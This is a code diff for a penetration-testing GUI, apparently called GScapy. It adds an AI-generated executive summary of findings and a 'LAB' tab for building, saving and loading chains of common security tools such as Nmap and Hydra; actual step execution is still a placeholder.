+            QMessageBox.warning(self, "No Data", "There are no findings to summarize. Please run the 'Aggregate & Enrich Results' tool first.")
+            return
+
+        findings_text = ""
+        for i in range(self.report_findings_tree.topLevelItemCount()):
+            item = self.report_findings_tree.topLevelItem(i)
+            host = item.text(0)
+            service = item.text(1)
+            finding = item.text(2)
+            details = item.text(3)
+            findings_text += f"- Host: {host}, Service: {service}, Finding: {finding}\n  Details: {details}\n\n"
+
+        prompt = (
+            "Based on the following list of penetration testing findings, please write a concise executive summary "
+            "suitable for a non-technical audience. Focus on the overall risk posture, key areas of weakness, "
+            "and high-level recommendations. The summary should be a few paragraphs long.\n\n"
+            f"--- FINDINGS ---\n{findings_text}--- END FINDINGS ---"
+        )
+
+        def _populate_summary(generated_text):
+            self.report_summary_text.setPlainText(generated_text)
+            QMessageBox.information(self, "Success", "AI-generated summary has been populated.")
+
+        self.ai_assistant_tab.set_completion_callback(_populate_summary)
+        self.ai_assistant_tab.send_message(prompt)
+        self.tab_widget.setCurrentWidget(self.ai_assistant_tab)
+        QMessageBox.information(self, "AI Task Started", "The AI is generating the summary. You will be notified upon completion. You can watch the progress in the 'AI Assistant' tab.")
+
+    def _create_lab_tab(self):
+        """Creates the UI for the LAB / Test Chaining tab."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        # Top control bar
+        controls_bar = QHBoxLayout()
+        self.lab_run_chain_btn = QPushButton(QIcon("icons/play-circle.svg"), " Run Test Chain")
+        self.lab_save_chain_btn = QPushButton(QIcon("icons/save.svg"), " Save Chain")
+        self.lab_load_chain_btn = QPushButton(QIcon("icons/folder.svg"), " Load Chain")
+        self.lab_run_chain_btn.clicked.connect(self.start_lab_chain)
+        self.lab_save_chain_btn.clicked.connect(self._lab_save_chain)
+        self.lab_load_chain_btn.clicked.connect(self._lab_load_chain)
+        controls_bar.addWidget(self.lab_run_chain_btn)
+        controls_bar.addWidget(self.lab_save_chain_btn)
+        controls_bar.addWidget(self.lab_load_chain_btn)
+        controls_bar.addStretch()
+        main_layout.addLayout(controls_bar)
+
+        main_splitter = QSplitter(Qt.Orientation.Horizontal)
+
+        left_panel = QGroupBox("Available Tools")
+        left_layout = QVBoxLayout(left_panel)
+        self.lab_tools_list = QListWidget()
+        left_layout.addWidget(self.lab_tools_list)
+        main_splitter.addWidget(left_panel)
+
+        center_panel = QWidget()
+        center_layout = QVBoxLayout(center_panel)
+        center_layout.setContentsMargins(0,0,0,0)
+        chain_box = QGroupBox("Test Chain Sequence")
+        chain_layout = QVBoxLayout(chain_box)
+        self.lab_chain_list = QListWidget()
+        chain_layout.addWidget(self.lab_chain_list)
+
+        chain_buttons = QHBoxLayout()
+        add_btn = QPushButton("Add ->"); add_btn.clicked.connect(self._lab_add_step)
+        remove_btn = QPushButton("<- Remove"); remove_btn.clicked.connect(self._lab_remove_step)
+        move_up_btn = QPushButton("Move Up"); move_up_btn.clicked.connect(self._lab_move_step_up)
+        move_down_btn = QPushButton("Move Down"); move_down_btn.clicked.connect(self._lab_move_step_down)
+        chain_buttons.addWidget(add_btn); chain_buttons.addWidget(remove_btn)
+        chain_buttons.addStretch(); chain_buttons.addWidget(move_up_btn); chain_buttons.addWidget(move_down_btn)
+        chain_layout.addLayout(chain_buttons)
+        center_layout.addWidget(chain_box)
+        main_splitter.addWidget(center_panel)
+
+        right_panel = QGroupBox("Step Configuration")
+        self.lab_config_stack = QStackedWidget()
+        right_panel.setLayout(QVBoxLayout())
+        right_panel.layout().addWidget(self.lab_config_stack)
+
+        placeholder_widget = QLabel("Select a step from the chain to configure it.")
+        placeholder_widget.setAlignment(Qt.AlignmentFlag.AlignCenter)
+        self.lab_config_stack.addWidget(placeholder_widget)
+
+        # Create new, independent instances of config widgets and their controls for the LAB
+        self.lab_tool_configs = {}
+
+        compatible_tools = [
+            ("Nmap Scan", self._create_nmap_config_widget),
+            ("Subdomain Scanner (Sublist3r)", self._create_subdomain_scanner_config_widget),
+            ("Subdomain Scanner (Subfinder)", self._create_subfinder_config_widget),
+            ("httpx Probe", self._create_httpx_config_widget),
+            ("RustScan", self._create_rustscan_config_widget),
+            ("dirsearch", self._create_dirsearch_config_widget),
+            ("ffuf", self._create_ffuf_config_widget),
+            ("enum4linux-ng", self._create_enum4linux_ng_config_widget),
+            ("dnsrecon", self._create_dnsrecon_config_widget),
+            ("fierce", self._create_fierce_config_widget),
+            ("Nikto Scan", self._create_nikto_config_widget),
+            ("Gobuster", self._create_gobuster_config_widget),
+            ("Nuclei Scanner", self._create_nuclei_config_widget),
+            ("TruffleHog Scanner", self._create_trufflehog_config_widget),
+            ("John the Ripper", self._create_jtr_config_widget),
+            ("Hydra", self._create_hydra_config_widget),
+            ("Sherlock", self._create_sherlock_config_widget),
+            ("Spiderfoot", self._create_spiderfoot_config_widget),
+            ("ARP Scan (CLI)", self._create_arp_scan_cli_config_widget)
+        ]
+
+        for name, config_method in compatible_tools:
+            self.lab_tools_list.addItem(name)
+            config_widget, controls = config_method()
+            self.lab_tool_configs[name] = {'widget': config_widget, 'controls': controls}
+            self.lab_config_stack.addWidget(config_widget)
+
+        self.lab_chain_list.currentItemChanged.connect(self._lab_on_chain_selection_changed)
+        main_splitter.addWidget(right_panel)
+        main_splitter.setSizes([200, 300, 500])
+        main_layout.addWidget(main_splitter)
+
+        return widget
+
+    def _get_config_from_ui(self, tool_name):
+        """Reads the current values from a tool's config UI and returns a dict."""
+        config = {}
+        if tool_name not in self.lab_tool_configs:
+            return config
+
+        controls = self.lab_tool_configs[tool_name]['controls']
+
+        if tool_name == "Nmap Scan":
+            for key, widget in controls.items():
+                if isinstance(widget, QLineEdit):
+                    config[key] = widget.text()
+                elif isinstance(widget, QCheckBox):
+                    config[key] = widget.isChecked()
+                elif isinstance(widget, QComboBox):
+                    config[key] = widget.currentText()
+        # Add other tools here as they are implemented
+
+        return config
+
+    def _set_config_to_ui(self, tool_name, config):
+        """Populates a tool's config UI from a config dict."""
+        if tool_name not in self.lab_tool_configs:
+            return
+
+        controls = self.lab_tool_configs[tool_name]['controls']
+
+        if tool_name == "Nmap Scan":
+            for key, widget in controls.items():
+                if key in config:
+                    if isinstance(widget, QLineEdit):
+                        widget.setText(config[key])
+                    elif isinstance(widget, QCheckBox):
+                        widget.setChecked(config[key])
+                    elif isinstance(widget, QComboBox):
+                        widget.setCurrentText(config[key])
+        # Add other tools here as they are implemented
+
+    def _lab_add_step(self):
+        """Adds a selected tool from the available list to the test chain."""
+        selected_item = self.lab_tools_list.currentItem()
+        if not selected_item:
+            QMessageBox.warning(self, "No Tool Selected", "Please select a tool from the 'Available Tools' list to add.")
+            return
+
+        tool_name = selected_item.text()
+
+        # Get the default configuration from the current state of the tool's UI
+        default_config = self._get_config_from_ui(tool_name)
+
+        step_data = {
+            'tool_name': tool_name,
+            'id': str(uuid.uuid4()),
+            'config': default_config
+        }
+        self.lab_test_chain.append(step_data)
+
+        # The list widget item stores the unique ID to link it back to the config
+        list_item = QListWidgetItem(f"Step {len(self.lab_test_chain)}: {tool_name}")
+        list_item.setData(Qt.ItemDataRole.UserRole, step_data['id'])
+        self.lab_chain_list.addItem(list_item)
+        self.lab_chain_list.setCurrentItem(list_item)
+
+
+    def _lab_remove_step(self):
+        """Removes the selected step from the test chain."""
+        selected_row = self.lab_chain_list.currentRow()
+        if selected_row < 0:
+            QMessageBox.warning(self, "No Step Selected", "Please select a step from the chain to remove.")
+            return
+
+        # Remove from UI
+        item = self.lab_chain_list.takeItem(selected_row)
+        item_id = item.data(Qt.ItemDataRole.UserRole)
+
+        # Remove from backend data model
+        self.lab_test_chain = [step for step in self.lab_test_chain if step['id'] != item_id]
+
+        # Renumber the remaining steps in the UI for clarity
+        for i in range(self.lab_chain_list.count()):
+            list_item = self.lab_chain_list.item(i)
+            tool_name = list_item.text().split(": ")[1]
+            list_item.setText(f"Step {i + 1}: {tool_name}")
+
+    def _lab_move_step_up(self):
+        """Moves the selected step up in the test chain."""
+        current_row = self.lab_chain_list.currentRow()
+        if current_row > 0:
+            item = self.lab_chain_list.takeItem(current_row)
+            self.lab_chain_list.insertItem(current_row - 1, item)
+            self.lab_chain_list.setCurrentRow(current_row - 1)
+            # Reorder the backend list as well
+            self.lab_test_chain.insert(current_row - 1, self.lab_test_chain.pop(current_row))
+            self._renumber_lab_steps()
+
+    def _lab_move_step_down(self):
+        """Moves the selected step down in the test chain."""
+        current_row = self.lab_chain_list.currentRow()
+        if 0 <= current_row < self.lab_chain_list.count() - 1:
+            item = self.lab_chain_list.takeItem(current_row)
+            self.lab_chain_list.insertItem(current_row + 1, item)
+            self.lab_chain_list.setCurrentRow(current_row + 1)
+            # Reorder the backend list as well
+            self.lab_test_chain.insert(current_row + 1, self.lab_test_chain.pop(current_row))
+            self._renumber_lab_steps()
+
+    def _renumber_lab_steps(self):
+        """Updates the text of the items in the lab chain list to reflect their new order."""
+        for i in range(self.lab_chain_list.count()):
+            item = self.lab_chain_list.item(i)
+            # The tool name doesn't change, just the step number
+            tool_name = self.lab_test_chain[i]['tool_name']
+            item.setText(f"Step {i + 1}: {tool_name}")
+
+    def _lab_on_chain_selection_changed(self, current, previous):
+        """Shows the correct configuration widget when a step in the chain is selected."""
+        # 1. Save the configuration of the previously selected item
+        if previous:
+            prev_id = previous.data(Qt.ItemDataRole.UserRole)
+            # Find the corresponding step in the backend list
+            for step in self.lab_test_chain:
+                if step['id'] == prev_id:
+                    tool_name = step['tool_name']
+                    # Get the current UI state and save it to the step's config
+                    step['config'] = self._get_config_from_ui(tool_name)
+                    logging.info(f"Saved config for step {step['tool_name']} (ID: {prev_id})")
+                    break
+
+        # 2. Load the configuration of the currently selected item
+        if not current:
+            self.lab_config_stack.setCurrentIndex(0) # Show placeholder
+            return
+
+        current_id = current.data(Qt.ItemDataRole.UserRole)
+        # Find the corresponding step in the backend list
+        for step in self.lab_test_chain:
+            if step['id'] == current_id:
+                tool_name = step['tool_name']
+                config = step['config']
+
+                # Use the dedicated lab widgets
+                if tool_name in self.lab_tool_configs:
+                    # Populate the UI with the stored config
+                    self._set_config_to_ui(tool_name, config)
+
+                    # Show the correct widget from the stack
+                    widget_to_show = self.lab_tool_configs[tool_name]['widget']
+                    self.lab_config_stack.setCurrentWidget(widget_to_show)
+                    logging.info(f"Loaded config for step {tool_name} (ID: {current_id})")
+                else:
+                    self.lab_config_stack.setCurrentIndex(0) # Fallback to placeholder
+                return
+
+    def _lab_save_chain(self):
+        """Saves the current test chain to a JSON file."""
+        if not self.lab_test_chain:
+            QMessageBox.information(self, "Empty Chain", "There is nothing to save.")
+            return
+
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Test Chain", "", "GScapy LAB Files (*.gscapy-lab)", options=QFileDialog.Option.DontUseNativeDialog)
+        if not file_path:
+            return
+
+        try:
+            with open(file_path, 'w') as f:
+                json.dump(self.lab_test_chain, f, indent=4)
+            self.status_bar.showMessage(f"Test chain saved to {file_path}", 5000)
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to save test chain: {e}")
+            logging.error(f"Failed to save LAB chain: {e}", exc_info=True)
+
+    def _lab_load_chain(self):
+        """Loads a test chain from a JSON file."""
+        if self.lab_test_chain:
+            reply = QMessageBox.question(self, "Confirm Load", "This will overwrite your current test chain. Are you sure?", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
+            if reply == QMessageBox.StandardButton.No:
+                return
+
+        file_path, _ = QFileDialog.getOpenFileName(self, "Load Test Chain", "", "GScapy LAB Files (*.gscapy-lab);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if not file_path:
+            return
+
+        try:
+            with open(file_path, 'r') as f:
+                loaded_chain = json.load(f)
+
+            # Basic validation
+            if not isinstance(loaded_chain, list) or not all('tool_name' in d and 'config' in d for d in loaded_chain):
+                raise ValueError("Invalid file format.")
+
+            self.lab_test_chain = loaded_chain
+            self.lab_chain_list.clear()
+
+            # Repopulate the UI list
+            for i, step in enumerate(self.lab_test_chain):
+                # Ensure each step has a unique ID if loading older formats
+                if 'id' not in step:
+                    step['id'] = str(uuid.uuid4())
+
+                list_item = QListWidgetItem(f"Step {i + 1}: {step['tool_name']}")
+                list_item.setData(Qt.ItemDataRole.UserRole, step['id'])
+                self.lab_chain_list.addItem(list_item)
+
+            self.status_bar.showMessage(f"Test chain loaded from {file_path}", 5000)
+
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Failed to load test chain: {e}")
+            logging.error(f"Failed to load LAB chain: {e}", exc_info=True)
+
+    def start_lab_chain(self):
+        """Starts the LAB chain execution worker thread."""
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+        if not self.lab_test_chain:
+            QMessageBox.information(self, "Empty Chain", "There are no steps in the test chain to run.")
+            return
+
+        self.is_tool_running = True
+        self.lab_run_chain_btn.setEnabled(False)
+        # In the future, a cancel button will be added
+        # self.lab_cancel_chain_btn.setEnabled(True)
+        self.tool_stop_event.clear()
+
+        # Deepcopy the chain to avoid race conditions if the user edits it while running
+        chain_to_run = copy.deepcopy(self.lab_test_chain)
+
+        self.worker = WorkerThread(_lab_chain_thread, args=(self, chain_to_run,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _lab_chain_thread(self, chain):
+        """Worker thread that executes each step of the LAB chain."""
+        q = self.tool_results_queue
+        logging.info(f"LAB chain execution started with {len(chain)} steps.")
+        lab_context = {} # This dictionary will hold results passed between steps
+
+        for i, step in enumerate(chain):
+            if self.tool_stop_event.is_set():
+                logging.info("LAB chain execution cancelled by user.")
+                break
+
+            tool_name = step['tool_name']
+            config = step['config']
+            q.put(('lab_status', f"Executing Step {i+1}/{len(chain)}: {tool_name}"))
+
+            # This is where the magic happens.
+            # For now, just log the config.
+            logging.info(f"--- Running LAB Step {i+1}: {tool_name} ---")
+            logging.info(f"Config: {json.dumps(config, indent=2)}")
+
+            # Placeholder for actual execution
+            time.sleep(2) # Simulate work
+
+
+        q.put(('tool_finished', 'lab_chain'))
+        logging.info("LAB chain execution finished.")
